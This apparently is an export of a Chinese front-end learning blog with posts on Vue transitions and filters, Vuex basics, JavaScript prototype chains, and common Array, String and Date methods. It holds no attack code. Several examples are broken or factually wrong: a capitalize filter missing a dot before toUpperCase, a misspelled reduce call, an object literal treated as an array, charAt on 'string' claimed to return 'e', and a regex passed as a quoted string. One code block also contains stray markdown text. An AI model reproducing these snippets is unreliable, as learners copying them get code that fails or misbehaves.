<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">:duration</span>=<span class="string">&quot;1000&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 定制进入和移出的持续时间 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">:duration</span>=<span class="string">&quot;&#123; enter: 500, leave: 800 &#125;&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="🌟-JavaScript-钩子"><a href="#🌟-JavaScript-钩子" class="headerlink" title="🌟 JavaScript 钩子"></a>🌟 <code>JavaScript</code> 钩子</h4><h3 id="x2600-状态过渡"><a href="#x2600-状态过渡" class="headerlink" title="&#x2600; 状态过渡"></a><span class="emoji" alias="sunny" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2600.png?v8">&#x2600;</span> 状态过渡</h3>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 - Vue 之过滤器</title>
    <url>/2021/01/31/vue-learn-9/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>过滤器可以用在俩地方: <strong>双花括号插值</strong> 和 <strong><code>v-bind</code> 表达式</strong> </p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<blockquote>
<p>过滤器应添加在 <code>JavaScript</code> 表达式的尾部, 由 <code>管道</code> 符号指示:</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在双花括号中 --&gt;</span></span><br><span class="line">&#123;&#123; message | capitalize&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在 v-bind 中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">&#x27;rawId | fomatId&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在一个组件的 <code>选项</code> 中定义本地的过滤器: (以首字母大写为例)</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">    capitalize: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!value) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        value = value.toString()</span><br><span class="line">        <span class="keyword">return</span> value.charAt(<span class="number">0</span>)toUpperCase() + value.slice(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>创建 <code>Vue</code> 实例之前全局定义过滤器: (同样以首字母大写为例)</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.filter(<span class="string">&#x27;capitalize&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!value) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    value = value.toString()</span><br><span class="line">    <span class="keyword">return</span> value.charAt(<span class="number">0</span>).toUpperCase() + value.slice(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="comment">// something</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>🌀 过滤器的串联是如何使用的? </p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; message | filterA | filterB&#125;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解释: <code>filterA</code> 被定义为接收单个参数的过滤器函数, 表达式 <code>message</code> 的值作为参数传入函数中; 同样的, 将 <code>filterA</code> 的值作为参数传递到 <code>filterB</code> 中</p>
<blockquote>
<p>当然也可以接收多个参数:</p>
</blockquote>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; message | filterA(&#x27;agr1&#x27;, &#x27;arg2&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>vuex</title>
    <url>/2021/03/13/vuex/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>向 <code>vuex</code> 进发!</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<blockquote>
<p>专为 Vue.js 开发的 <strong>状态管理模式</strong></p>
</blockquote>
<h4 id="核心部件-jStore"><a href="#核心部件-jStore" class="headerlink" title="核心部件 jStore"></a>核心部件 j<code>Store</code></h4><blockquote>
<ol>
<li>容器, 包含应用中大部分的状态(<code>state</code>)<blockquote>
</blockquote>
</li>
<li>状态存储响应式: 当 <code>Vue</code> 组件从 <code>Store</code> 读取状态, 若 <code>store</code> 状态改变, 则相应的组件也会更新<blockquote>
</blockquote>
</li>
<li>不可直接改变  <code>store</code> 的状态: 唯一途径是显式提交(<code>commit</code>) <code>mutation</code></li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        count: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        increment (state) &#123;</span><br><span class="line">            state.count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.commit(<span class="string">&#x27;increment&#x27;</span>); <span class="comment">// 触发状态变更</span></span><br><span class="line"><span class="built_in">console</span>.log(store.state.count); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了在 Vue 组件中访问 store</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    store: store,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="这是一个约定-并不直接修改值-store-state-count-val-而是通过提交-mutation-的方式-好处是咱们可以清楚状态的改变过程"><a href="#这是一个约定-并不直接修改值-store-state-count-val-而是通过提交-mutation-的方式-好处是咱们可以清楚状态的改变过程" class="headerlink" title="这是一个约定, 并不直接修改值: store.state.count = val, 而是通过提交 mutation 的方式, 好处是咱们可以清楚状态的改变过程"></a>这是一个约定, 并不直接修改值: store.state.count = val, 而是通过提交 <code>mutation</code> 的方式, 好处是咱们可以清楚状态的改变过程</h6><pre><code class="js">// 先来注册一个 Counter 组件
const Counter = &#123;
    template: `&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;`,
    computed: &#123;
        count () &#123;
            return this.$store.state.count;
        &#125;
    &#125;
&#125;
// Vuex 通过 store 选项, 提供机制: 将 state 从根组件 注入 但每一个子组件中, 通过 this.$store 访问
const app = new Vue(&#123;
    el: &quot;#app&quot;,
    store, 
    components: &#123;Counter&#125;,
    template: `
        &lt;div class=&quot;app&quot;&gt;
            &lt;counter&gt;&lt;/counter&gt;
        &lt;/div&gt;
    `
&#125;)</code></pre>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>vuex</tag>
      </tags>
  </entry>
  <entry>
    <title>前端布局 - 之“查缺补漏”</title>
    <url>/2021/02/10/findOut-flaws-make-Up/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>整理一些前端中遗漏的问题</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<h4 id="⭐-Javascript-对象原型"><a href="#⭐-Javascript-对象原型" class="headerlink" title="⭐ Javascript 对象原型"></a>⭐ <code>Javascript</code> 对象原型</h4><ol>
<li>理解对象的原型</li>
<li>理解构造函数的 <code>prototype</code> 属性</li>
</ol>
<h6 id="在此之前-必须知道对象的特性-对象的引用"><a href="#在此之前-必须知道对象的特性-对象的引用" class="headerlink" title="在此之前, 必须知道对象的特性: 对象的引用"></a>在此之前, 必须知道对象的特性: 对象的引用</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; <span class="number">1.</span> 实例对象都有一个私有属性: <span class="string">`__proto__`</span>, 并指向它的构造函数的原型对象: <span class="string">`prototype`</span></span><br><span class="line">&gt; <span class="number">2.</span> 也就是说, <span class="string">`object = &#123;&#125;`</span>: <span class="string">`object.__proto__ == object.constructor.prototype`</span></span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">// 定义函数并打印函数原型属性</span></span><br><span class="line"><span class="string">function doSomething()&#123;&#125;</span></span><br><span class="line"><span class="string">console.log( doSomething.prototype );</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">constructor</span>: ƒ <span class="title">doSomething</span>(<span class="params"></span>),</span><br><span class="line">    <span class="title">__proto__</span>: &#123;</span><br><span class="line">        <span class="title">constructor</span>: ƒ <span class="title">Object</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">hasOwnProperty</span>: ƒ <span class="title">hasOwnProperty</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">isPrototypeOf</span>: ƒ <span class="title">isPrototypeOf</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">propertyIsEnumerable</span>: ƒ <span class="title">propertyIsEnumerable</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">toLocaleString</span>: ƒ <span class="title">toLocaleString</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">toString</span>: ƒ <span class="title">toString</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">valueOf</span>: ƒ <span class="title">valueOf</span>(<span class="params"></span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">doSomething.prototype.foo = <span class="string">&quot;bar&quot;</span>; <span class="comment">// add a property onto the prototype</span></span><br><span class="line"><span class="keyword">var</span> doSomeInstancing = <span class="keyword">new</span> doSomething();</span><br><span class="line">doSomeInstancing.prop = <span class="string">&quot;some value&quot;</span>; <span class="comment">// add a property onto the object</span></span><br><span class="line"><span class="built_in">console</span>.log( doSomeInstancing );</span><br></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    prop: <span class="string">&quot;some value&quot;</span>,</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        foo: <span class="string">&quot;bar&quot;</span>,</span><br><span class="line">        <span class="title">constructor</span>: ƒ <span class="title">doSomething</span>(<span class="params"></span>),</span><br><span class="line">        <span class="title">__proto__</span>: &#123;</span><br><span class="line">            <span class="title">constructor</span>: ƒ <span class="title">Object</span>(<span class="params"></span>),</span><br><span class="line">            <span class="title">hasOwnProperty</span>: ƒ <span class="title">hasOwnProperty</span>(<span class="params"></span>),</span><br><span class="line">            <span class="title">isPrototypeOf</span>: ƒ <span class="title">isPrototypeOf</span>(<span class="params"></span>),</span><br><span class="line">            <span class="title">propertyIsEnumerable</span>: ƒ <span class="title">propertyIsEnumerable</span>(<span class="params"></span>),</span><br><span class="line">            <span class="title">toLocaleString</span>: ƒ <span class="title">toLocaleString</span>(<span class="params"></span>),</span><br><span class="line">            <span class="title">toString</span>: ƒ <span class="title">toString</span>(<span class="params"></span>),</span><br><span class="line">            <span class="title">valueOf</span>: ƒ <span class="title">valueOf</span>(<span class="params"></span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🌀 总结: </p>
<ol>
<li><p>doSomeInstancing 的 <code>__proto__</code> 属性就是doSomething.prototype </p>
</li>
<li><p>当访问 <code>doSomeInstancing</code> 的一个属性, 浏览器首先查找 <code>doSomeInstancing</code> 是否有这个属性</p>
</li>
<li><p>如果 <code>doSomeInstancing</code> 没有这个属性, 浏览器就会在 <code>doSomeInstancing</code> 的 <code>__proto__</code> 中查找这个属性(也就是 <code>doSomething.prototype</code> )</p>
</li>
<li><p>如果 doSomeInstancing 的 <code>__proto__</code> 没有这个属性, 浏览器就会去查找 <code>doSomeInstancing</code> 的 <code>__proto__</code> 的 <code>__proto__</code> ，看它是否有这个属性</p>
</li>
<li><p>默认情况下, 所有函数的原型属性的 <code>__proto__ </code>就是 <code>window.Object.prototype</code></p>
</li>
<li><p>还没有该属性就是 <code>undefined</code></p>
</li>
</ol>
</blockquote>
<blockquote>
<p><strong>用更好理解的例子:</strong></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// f 对象的构造函数</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 f 对象</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 f 函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// o.[[Prototype]] 也就是 o.__proto__</span></span><br><span class="line"><span class="comment">// 它有属性 a b</span></span><br><span class="line"><span class="comment">// o.__proto__  =&gt;  o.constructor.prototype</span></span><br><span class="line"><span class="comment">// o.__proto__.__proto__  =&gt;  Object</span></span><br><span class="line"><span class="comment">// o.__proto__.__proto__.__proto__   =&gt;  null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line">o.a <span class="comment">// 1</span></span><br><span class="line">o.b <span class="comment">// 2</span></span><br><span class="line">o.c <span class="comment">// 4</span></span><br><span class="line">o.__proto__.b <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>再如:</strong></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>

<h4 id="⭐-数组常用方法"><a href="#⭐-数组常用方法" class="headerlink" title="⭐ 数组常用方法"></a>⭐ 数组常用方法</h4><p>参考数组: </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fruits = [<span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Orange&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>Array.prototype.forEach()</code></p>
<blockquote>
<p>遍历数组 - 不改变原数组</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, array</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item, index);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// Apple 0</span></span><br><span class="line"><span class="comment">// Orange 1</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.concat</code></p>
<blockquote>
<p>合并两个或多个数组, 不改变现有数组, 返回新数组:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> newArray = fruits.concat(num); </span><br><span class="line"><span class="comment">// [&#x27;Apple&#x27;, &#x27;Orange&#x27;, 1, 2, 3]`</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.every()</code></p>
<blockquote>
<p>测试数组内元素是否<strong>都能</strong>通过某个指定函数的测试:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isBelowThreshold = <span class="function">(<span class="params">currentValue</span>) =&gt;</span> currentValue &lt; <span class="number">3</span>;</span><br><span class="line"><span class="built_in">console</span>.log(num.every(isBelowThreshold)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>[注意]: 回调函数 <code>callback</code> 接受 3 个参数: <span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span> <code>element</code> (当前值); <span class="emoji" alias="two" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8">&#x0032;&#xfe0f;&#x20e3;</span> <code>index</code> (可选, 索引); <span class="emoji" alias="three" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8">&#x0033;&#xfe0f;&#x20e3;</span> <code>array</code>(调用 <code>every</code> 的当前数组)</p>
</blockquote>
</li>
<li><p><code>Array.prototype.filter()</code></p>
<blockquote>
<p>创建一个新数组, 包含通过所提供函数实现的测试的所有元素:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> belowThreshold = num.filter(<span class="function"><span class="params">value</span> =&gt;</span> value &gt;= <span class="number">2</span>);</span><br><span class="line"><span class="comment">// [2, 3]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意: 回调函数 <code>callback</code> 接收 3 个参数: </p>
<blockquote>
</blockquote>
<ul>
<li><code>element</code>: 当前正在处理的元素;<blockquote>
</blockquote>
</li>
<li><code>index</code>: 索引;<blockquote>
</blockquote>
</li>
<li><code>array</code>: 调用了 <code>filter</code> 的数组本身;<blockquote>
</blockquote>
</li>
</ul>
</blockquote>
</li>
<li><p><code>Array.prototype.find()</code></p>
<blockquote>
<p>返回数组中满足提供的测试函数的第一个元素的值, 否则返回 <code>undefined</code>: </p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> number = num.find(<span class="function"><span class="params">element</span> =&gt;</span> element &gt; <span class="number">1</span>); <span class="comment">// 2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区别: 返回索引</span></span><br><span class="line"><span class="keyword">var</span> index = num.findIndex(<span class="function"><span class="params">element</span> =&gt;</span> element &gt; <span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区别: 找到第一个给定元素的第一个索引</span></span><br><span class="line"><span class="built_in">console</span>.log(fruits.indexOf(<span class="string">&#x27;Orange&#x27;</span>, <span class="number">1</span>)); <span class="comment">// 1; 第二个参数表示从下标 1 开始找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区别: 返回从后往前找的第一个指定元素的索引</span></span><br><span class="line"><span class="built_in">console</span>.log(fruits.lastIndexOf(<span class="string">&#x27;Orange&#x27;</span>, <span class="number">0</span>)); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Array.prototype.join()</code></p>
<blockquote>
<p>将一个数组的所有元素连接成一个字符串并返回这个字符串:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认 &quot;,&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(fruits.join(<span class="string">&#x27;-&#x27;</span>)); <span class="comment">// &quot;Apple-Orange&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.map()</code></p>
<blockquote>
<p>创建新数组, 按照回调函数的要求返回值: (原不变)</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> newFruits = num.map(<span class="function"><span class="params">element</span> =&gt;</span> element*<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.push()</code></p>
<blockquote>
<p>添加元素到数组末尾, 返回数组新长度: <code>fruits.push(&#39;Banana&#39;);</code></p>
</blockquote>
</li>
<li><p><code>Array.prototype.pop()</code></p>
<blockquote>
<p>删除数组末尾元素, 返回该元素值: <code>fruits.pop(); </code></p>
</blockquote>
</li>
<li><p><code>Array.prototype.reverse()</code></p>
<blockquote>
<p>颠倒元素位置, 并返回该数组: <code>fruits.reverse()</code></p>
</blockquote>
</li>
<li><p><code>Array.prototype.shift()</code></p>
<blockquote>
<p>删除数组最前面 (头部) 的元素, 返回该值: <code>fruits.shift()</code></p>
</blockquote>
</li>
<li><p><code>Array.prototype.slice()</code></p>
<blockquote>
<p>返回新数组, 由 <code>begin</code> 和 <code>end</code> 决定的原数组的浅拷贝, (包括 <code>begin</code>, 不包括 <code>end</code>):</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fruits.slice(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line"><span class="comment">// [&#x27;Apple&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意对象</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> first = &#123;a, <span class="string">&#x27;hh&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> second = first.slice(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">a.color = <span class="string">&#x27;yellow&#x27;</span> </span><br><span class="line"><span class="comment">// now a.color | first[0].color | second[0].color all have turned into &#x27;yellow&#x27;</span></span><br><span class="line"></span><br><span class="line">first[<span class="number">0</span>].color = <span class="string">&#x27;red&#x27;</span> </span><br><span class="line"><span class="comment">// same as above, same if you change second[0].color</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为三数组传入的都是对象的引用, 引用都指向同一个对象</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.splice()</code></p>
<blockquote>
<p>删除或替换现有元素, 或添加新元素, 返回被修改的内容, <strong>不是被修改的数组</strong>, 原数组改变:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第二个参数 deleteCount</span></span><br><span class="line"><span class="comment">// 0 或 负: 不删, 至少添加一个新元素</span></span><br><span class="line"><span class="comment">// 大于剩余元素个数: 全删</span></span><br><span class="line"><span class="comment">// 其他: 删 指定个数</span></span><br><span class="line"><span class="keyword">var</span> num = [<span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;second&#x27;</span>, <span class="string">&#x27;third&#x27;</span>, <span class="string">&#x27;fourth&#x27;</span>];</span><br><span class="line">num.splice(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&quot;s&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(num); <span class="comment">// [&#x27;first&#x27;, &#x27;second&#x27;, &quot;s&quot;, &#x27;third&#x27;, &#x27;fourth&#x27;]</span></span><br><span class="line">num.splice(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(num); <span class="comment">// [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;third&#x27;, &#x27;fourth&#x27;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.toString()</code></p>
<blockquote>
<p>返回字符串: <code>console.log(num.toString())</code></p>
</blockquote>
</li>
<li><p><code>Array.prototype.unshift()</code></p>
<blockquote>
<p>将一个或多个元素添加到数组开头, 返回数组新长度, 修改了原数组:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(num.unshift(<span class="number">3</span>,<span class="number">4</span>)); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(num); <span class="comment">// [3, 4, 1, 2, 3]</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.reduce()</code></p>
<blockquote>
<p>对数组中每个元素执行一个提供的 <code>reducer</code> 函数(升序执行), 结果为单个返回值:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// callback 函数:</span></span><br><span class="line"><span class="comment">// 1. accumulator: 累计器累计回调的返回值, 上一次调用回调返回的累积值, 或 initialValue</span></span><br><span class="line"><span class="comment">// 2. currentValue: 数组正在处理的值</span></span><br><span class="line"><span class="comment">// 3. index</span></span><br><span class="line"><span class="comment">// 4. array: 调用 reduce() 的数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// reduce 函数:</span></span><br><span class="line"><span class="comment">// 1. callback</span></span><br><span class="line"><span class="comment">// 2. initialValue: 初始值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">accumulator, currentValue</span>) =&gt;</span> accumulator + currentValue;</span><br><span class="line"></span><br><span class="line">array.reduce(reducer) <span class="comment">// 10</span></span><br><span class="line">array.reducr(reducer, <span class="number">5</span>) <span class="comment">// 15</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Array.prototype.entries()</code></p>
<blockquote>
<p>返回一个新的 Array Iterator 对象, 该对象包含数组中每个索引的 键/值 对</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> iterator = array.entries()</span><br><span class="line"><span class="built_in">console</span>.log(iterator.next().value) <span class="comment">//[0, &#x27;a&#x27;]</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator.next().value) <span class="comment">//[1, &#x27;b&#x27;]</span></span><br></pre></td></tr></table></figure>
<h4 id="⭐-常用-String-方法"><a href="#⭐-常用-String-方法" class="headerlink" title="⭐ 常用 String 方法"></a>⭐ 常用 <code>String</code> 方法</h4></li>
<li><p>以 <code>var example = &#39;string&#39;</code> 为参考</p>
</li>
<li><p><code>String.prototype.charAt()</code></p>
<blockquote>
<p>从一个字符串中返回指定的字符</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// charAt(index) </span></span><br><span class="line">example.charAt() <span class="comment">// &#x27;e&#x27;</span></span><br><span class="line">example.charAt(<span class="number">2</span>) <span class="comment">// &#x27;r&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>String.prototype.charCodeAt()</code></p>
<blockquote>
<p>返回 0-65535 之间整数, 表示给定索引出的 UTF-16 代码单元, 用法通 <code>charAt</code></p>
</blockquote>
</li>
<li><p><code>String.prototype.replace()</code></p>
<blockquote>
<p><code>replace(regexp|subsr, newSubstr|function)</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="string">&#x27;hello, dog&#x27;</span>;</span><br><span class="line">p.replace(<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>) </span><br><span class="line">p.replace(<span class="string">&#x27;/(\w+)\s(\w+)/&#x27;</span>, <span class="string">&#x27;$2, $1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="⭐-常用内置对象"><a href="#⭐-常用内置对象" class="headerlink" title="⭐ 常用内置对象"></a>⭐ 常用内置对象</h4></li>
</ul>
<ol>
<li><code>Math</code></li>
<li><code>Date</code>  </li>
</ol>
<ul>
<li>创建日期对象:<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>([parameters]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&quot;March 5, 2021 15:45:34&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2021</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2021</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">45</span>, <span class="number">34</span>)</span><br></pre></td></tr></table></figure></li>
<li><code>Date</code> 对象的方法</li>
</ul>
<ol>
<li><code>get 类</code>:</li>
</ol>
<ul>
<li><code>getDate()</code>: 返回一个具体日期的日; 1-31</li>
